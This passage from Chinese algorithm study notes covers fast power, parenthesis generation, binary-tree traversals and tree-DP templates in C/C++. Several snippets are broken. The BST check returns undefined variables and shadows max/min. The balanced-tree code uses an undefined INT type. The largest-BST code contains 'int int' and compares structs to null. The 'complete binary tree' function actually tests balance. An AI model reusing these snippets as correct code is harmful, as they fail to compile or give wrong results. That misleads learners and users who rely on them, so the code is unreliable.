class="hljs-built_in">myPow</span>(x, -n);  <span class="hljs-comment">// 负数次幂</span><br>    <span class="hljs-type">double</span> temp = <span class="hljs-built_in">myPow</span>(x, n / <span class="hljs-number">2</span>);  <span class="hljs-comment">// 递归计算</span><br>    <span class="hljs-type">double</span> ans = temp * temp;  <span class="hljs-comment">// 平方</span><br>    <span class="hljs-keyword">if</span> (n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) ans *= x;  <span class="hljs-comment">// 处理奇数次幂</span><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析</strong>：</p><ul><li><strong>时间复杂度</strong>：O(log n)，递归每次将 <code>n</code> 减半。</li><li><strong>空间复杂度</strong>：O(log n)，递归调用栈的深度。</li></ul><hr><h4 id="括号生成问题："><a href="#括号生成问题：" class="headerlink" title="括号生成问题："></a><strong>括号生成问题</strong>：</h4><p>给定整数 <code>n</code>，生成所有可能的包含 <code>n</code> 对括号的有效组合。</p><p><strong>算法思路</strong>：</p><ul><li>使用递归生成所有括号组合，依次生成 <code>k</code> 对括号与 <code>n-k</code> 对括号的组合，再将它们合并。</li><li><strong>递归优化</strong>：通过 <code>unordered_map</code> 缓存中间结果，避免重复计算（记忆化搜索）。</li><li>设生成的括号组合可以看作 <code>S = (A)B</code>其中 <code>A</code> 是在 <code>k-1</code> 对括号的基础上生成的组合，<code>B</code> 是在 <code>n-k</code> 对括号的基础上生成的组合。</li></ul><p><strong>代码实现</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">generateParenthesis</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;&quot;</span>&#125;;  <span class="hljs-comment">// 基本情况，n=0时返回空字符串</span><br>    <span class="hljs-keyword">if</span> (store.<span class="hljs-built_in">find</span>(n) != store.<span class="hljs-built_in">end</span>()) <span class="hljs-keyword">return</span> store[n];  <span class="hljs-comment">// 如果已经计算过，直接返回缓存的结果</span><br>    <br>    vector&lt;string&gt; ans;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k++) &#123;  <span class="hljs-comment">// 遍历所有可能的 k 值(A)B</span><br>        vector&lt;string&gt; A = <span class="hljs-built_in">generateParenthesis</span>(k - <span class="hljs-number">1</span>);  <span class="hljs-comment">// 生成 k-1 对括号</span><br>        vector&lt;string&gt; B = <span class="hljs-built_in">generateParenthesis</span>(n - k);  <span class="hljs-comment">// 生成 n-k 对括号</span><br>        <span class="hljs-keyword">for</span> (string&amp; a : A) &#123;<br>            <span class="hljs-keyword">for</span> (string&amp; b : B) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;(&quot;</span> + a + <span class="hljs-string">&quot;)&quot;</span> + b);  <span class="hljs-comment">// 将两部分组合</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    store[n] = ans;  <span class="hljs-comment">// 缓存当前 n 对括号的所有组合</span><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br>unordered_map&lt;<span class="hljs-type">int</span>, vector&lt;string&gt;&gt; store;  <span class="hljs-comment">// 用于记忆化搜索，避免重复计算</span><br></code></pre></td></tr></table></figure><p><strong>分析</strong>：</p><ul><li><strong>记忆化搜索</strong>：通过 <code>unordered_map</code> 缓存递归中间结果，避免重复计算，提升效率。</li><li><strong>时间复杂度</strong>：理论上为 O(4^n &#x2F; sqrt(n))，因为每次递归生成所有可能的括号组合。</li></ul><hr><h2 id="十五-二叉树"><a href="#十五-二叉树" class="headerlink" title="十五.二叉树"></a>十五.二叉树</h2><p>二叉树是一种树形数据结构，其中每个节点最多有两个子节点，分别称为左子节点和右子节点。</p><p><strong>遍历方式</strong>：</p><ul><li><strong>前序遍历</strong>（Pre-order Traversal）：按根节点 -&gt; 左子树 -&gt; 右子树的顺序遍历。</li><li><strong>中序遍历</strong>（In-order Traversal）：按左子树 -&gt; 根节点 -&gt; 右子树的顺序遍历。</li><li><strong>后序遍历</strong>（Post-order Traversal）：按左子树 -&gt; 右子树 -&gt; 根节点的顺序遍历。</li><li><strong>层次遍历</strong>（Level-order Traversal）：按层从上到下、从左到右的顺序遍历树节点。</li></ul><h4 id="遍历方式总结："><a href="#遍历方式总结：" class="headerlink" title="遍历方式总结："></a><strong>遍历方式总结</strong>：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 二叉树节点定义</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> &#123;<br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br><br>    <span class="hljs-built_in">TreeNode</span>(<span class="hljs-type">int</span> value) : <span class="hljs-built_in">val</span>(value), <span class="hljs-built_in">left</span>(<span class="hljs-literal">nullptr</span>), <span class="hljs-built_in">right</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 前序遍历 (根-左-右)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preorder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    cout &lt;&lt; root-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-built_in">preorder</span>(root-&gt;left);<br>    <span class="hljs-built_in">preorder</span>(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// 中序遍历 (左-根-右)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">inorder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">inorder</span>(root-&gt;left);<br>    cout &lt;&lt; root-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-built_in">inorder</span>(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// 后序遍历 (左-右-根)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">postorder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">postorder</span>(root-&gt;left);<br>    <span class="hljs-built_in">postorder</span>(root-&gt;right);<br>    cout &lt;&lt; root-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// 层序遍历 (广度优先遍历)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">levelOrder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    queue&lt;TreeNode*&gt; q;<br>    q.<span class="hljs-built_in">push</span>(root);<br>    <br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        TreeNode* node = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        cout &lt;&lt; node-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span> (node-&gt;left) q.<span class="hljs-built_in">push</span>(node-&gt;left);<br>        <span class="hljs-keyword">if</span> (node-&gt;right) q.<span class="hljs-built_in">push</span>(node-&gt;right);<br>    &#125;<br>&#125;<br>              a<br>            /  \<br>           b      c<br>         / \    / \<br>        d   e   f   g<br>                 <br>递归序：  a b d d d b e e e b a c f f f c g g g c a   这是计算机解决的流程即左右和本身               <br>前中后序就是挑哪个是：第一二三次出现排序            <br>规律：先序:abdec | fg <br>        后序:debf | gca     任意选一个字母例如f，先序前和后序后的交集ca就是它全部的祖先<br></code></pre></td></tr></table></figure><h3 id="递归模板"><a href="#递归模板" class="headerlink" title="递归模板"></a>递归模板</h3><p>树形dp——从左树底端开始左右孩子都要info信息然后整合成一个信息成为孩子给父信息</p><p>step1.想以x为头（答案）怎么实现，不是x头又怎么实现，把这些实现需要的状态空间info列出求全集</p><p>step2.这些信息初始化在 Info process ，将这些信息在Info process这个函数里实现，如果这个信息涉及之前的分类讨论，就分多条件讨论</p><h3 id="例题-6"><a href="#例题-6" class="headerlink" title="例题"></a>例题</h3><h4 id="判断是否为完全二叉树"><a href="#判断是否为完全二叉树" class="headerlink" title="判断是否为完全二叉树"></a>判断是否为完全二叉树</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//判断是否为完全二叉树，第一，此题不用区分是不是头，判断需要看左右孩子是否是平衡二叉树，做到这里需要知道左右孩子的高度，所以info信息里需要知道是不是平衡二叉树和高度是几就行。然后就是如何判断是否为二叉树的算法，如何得到高度的算法Info process写在这个函数里,要么穷举出所有可能，要么写算法判断</span><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span>   <span class="hljs-comment">//每个节点需要的信息收集</span><br>    <span class="hljs-type">bool</span> isCBT;<br>    <span class="hljs-type">int</span> height;<br>    Info(<span class="hljs-type">bool</span> cbt, <span class="hljs-type">int</span> h) : isCBT(cbt), height(h) &#123;&#125;<br>&#125;;<br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(Node* X)</span> &#123;   <span class="hljs-comment">//判断逻辑返回信息</span><br>    <span class="hljs-keyword">if</span> (!X) <span class="hljs-keyword">return</span> Info(<span class="hljs-literal">true</span>, <span class="hljs-number">0</span>);<br>    Info leftInfo = process(X-&gt;left);<br>    Info rightInfo = process(X-&gt;right);<br>    <span class="hljs-type">int</span> height = max(leftInfo.height, rightInfo.height) + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">bool</span> isCBT = leftInfo.isCBT &amp;&amp; rightInfo.isCBT &amp;&amp;<br>                 (leftInfo.height == rightInfo.height || leftInfo.height == rightInfo.height + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> Info(isCBT, height);<br>&#125;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">isCBT</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> head ? process(head).isCBT : <span class="hljs-literal">true</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="是否是二叉搜索树"><a href="#是否是二叉搜索树" class="headerlink" title="是否是二叉搜索树"></a>是否是二叉搜索树</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//是否是二叉搜索树</span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 定义宏将 int 替换为 long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT_MIN LLONG_MIN</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT_MAX LLONG_MAX</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">bool</span> isBST;<br>    INT max;  <span class="hljs-comment">// 使用 long long 类型</span><br>    INT min;  <span class="hljs-comment">// 使用 long long 类型</span><br>    Info(<span class="hljs-type">bool</span> i, INT ma, INT mi) : isBST(i), max(ma), min(mi) &#123;&#125;<br>&#125;;<br><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(Node* x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!x) <span class="hljs-keyword">return</span> Info(<span class="hljs-literal">true</span>, INT_MIN, INT_MAX);  <span class="hljs-comment">// 空节点是合法的 BST</span><br>    Info leftInfo = process(x-&gt;left);<br>    Info rightInfo = process(x-&gt;right);<br>    <br>    INT max = x-&gt;value;  <span class="hljs-comment">// 使用 long long 类型</span><br>    <span class="hljs-keyword">if</span> (leftInfo.isBST) max = max(max, leftInfo.max);<br>    <span class="hljs-keyword">if</span> (rightInfo.isBST) max = max(max, rightInfo.max);<br><br>    INT min = x-&gt;value;  <span class="hljs-comment">// 使用 long long 类型</span><br>    <span class="hljs-keyword">if</span> (leftInfo.isBST) min = min(min, leftInfo.min);<br>    <span class="hljs-keyword">if</span> (rightInfo.isBST) min = min(min, rightInfo.min);<br><br>    <span class="hljs-type">bool</span> isBST = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!leftInfo.isBST || !rightInfo.isBST) isBST = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (leftInfo.isBST &amp;&amp; leftInfo.max &gt;= x-&gt;value) isBST = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span> (rightInfo.isBST &amp;&amp; rightInfo.min &lt;= x-&gt;value) isBST = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">return</span> Info(isBST, maxVal, minVal);<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isBST</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> head ? process(head).isBST : <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 处理空树的情况</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="判断是否为平衡二叉树"><a href="#判断是否为平衡二叉树" class="headerlink" title="判断是否为平衡二叉树"></a>判断是否为平衡二叉树</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">bool</span> isBalanced;<br>    INT height;<br>    Info(<span class="hljs-type">bool</span> i, INT h) : isBalanced(i), height(h) &#123;&#125;<br>&#125;;<br><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(Node* x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!x) <span class="hljs-keyword">return</span> Info(<span class="hljs-literal">true</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 空节点是平衡的，高度为 0</span><br>    Info leftInfo = process(x-&gt;left);<br>    Info rightInfo = process(x-&gt;right);<br>    <span class="hljs-comment">// 计算当前节点的高度</span><br>    INT height = max(leftInfo.height, rightInfo.height) + <span class="hljs-number">1</span>;  <br>   <br>    <span class="hljs-type">bool</span> isBalanced = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!leftInfo.isBalanced || !rightInfo.isBalanced) &#123;<br>        isBalanced = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 如果左子树或右子树不平衡，当前节点也不平衡</span><br>    &#125;   <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">abs</span>(leftInfo.height - rightInfo.height) &gt; <span class="hljs-number">1</span>) &#123;<br>        isBalanced = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 如果左右子树高度差大于 1，当前节点不平衡</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> Info(isBalanced, height);  <span class="hljs-comment">// 返回当前节点是否平衡和它的高度</span><br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isBalanced</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> head ? process(head).isBalanced : <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 处理空树的情况</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="判断是否为满二叉树"><a href="#判断是否为满二叉树" class="headerlink" title="判断是否为满二叉树"></a>判断是否为满二叉树</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 左树满 &amp;&amp; 右树满 &amp;&amp; 左右树高度一样 -&gt; 整棵树是满的</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 定义宏将 int 替换为 long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT_MIN LLONG_MIN</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INT_MAX LLONG_MAX</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info2</span> &#123;</span><br>    <span class="hljs-type">bool</span> isFull;<br>    INT height;<br>    Info2(<span class="hljs-type">bool</span> f, INT h) : isFull(f), height(h) &#123;&#125;<br>&#125;;<br><br>Info2 <span class="hljs-title function_">process2</span><span class="hljs-params">(Node* h)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!h) <span class="hljs-keyword">return</span> Info2(<span class="hljs-literal">true</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 空节点是满的，高度为 0</span><br>    Info2 leftInfo = process2(h-&gt;left);<br>    Info2 rightInfo = process2(h-&gt;right);<br>    <br>    <span class="hljs-type">bool</span> isFull = leftInfo.isFull &amp;&amp; rightInfo.isFull &amp;&amp; leftInfo.height == rightInfo.height;<br>    INT height = max(leftInfo.height, rightInfo.height) + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 当前节点的高度</span><br>    <span class="hljs-keyword">return</span> Info2(isFull, height);  <span class="hljs-comment">// 返回当前节点是否满和它的高度</span><br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">isFull</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> head ? process2(head).isFull : <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 处理空树的情况，空树为满树</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="找最大二叉搜索子树"><a href="#找最大二叉搜索子树" class="headerlink" title="找最大二叉搜索子树"></a>找最大二叉搜索子树</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//最大二叉搜索子树，当x不做头时要统计左右孩子最大二叉搜索子树的大小，当x做头时，左右是不是搜索二叉树，左右maxmin，左右树大小size，</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span><br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br>    TreeNode(<span class="hljs-type">int</span> x) : val(x), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">int</span> maxBSTSubtreeSize; <br>    <span class="hljs-type">int</span> allSize;  <span class="hljs-comment">//原本应该有isBST但是当allSize==maxBSTSubtreeSize，isBST就是true所以省略</span><br>    <span class="hljs-type">int</span> max;<br>    <span class="hljs-type">int</span> min;<br>    Info(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> ma, <span class="hljs-type">int</span> mi) : maxBSTSubtreeSize(m), allSize(a), max(ma), min(mi) &#123;&#125;<br>&#125;;<br><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(TreeNode* x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!x) &#123;<br>        <span class="hljs-keyword">return</span> Info(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, INT_MIN, INT_MAX);  <span class="hljs-comment">// 空节点，大小为0，最大值最小值分别为 INT_MIN 和 INT_MAX</span><br>    &#125;<br>    Info leftInfo = process(x-&gt;left);<br>    Info rightInfo = process(x-&gt;right);<br><br>    <span class="hljs-comment">//初始值设置</span><br>    <span class="hljs-type">int</span> max = x-&gt;val;<br>    <span class="hljs-type">int</span> min = x-&gt;val;  <br>    <span class="hljs-type">int</span> allSize = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 当前节点算一个</span><br>    <span class="hljs-keyword">if</span> (leftInfo != null) &#123;<br>        maxVal = max(max, leftInfo.max);<br>        minVal = min(min, leftInfo.min);<br>        allSize += leftInfo.allSize;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (rightInfo != null) &#123;<br>        max = max(max, rightInfo.max);<br>        min = min(min, rightInfo.min);<br>        allSize += rightInfo.allSize;<br>    &#125;<br><span class="hljs-comment">//p123是三种可能性，取出最大可能</span><br>    <span class="hljs-type">int</span> <span class="hljs-type">int</span> p1 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (leftInfo != null) p1 = 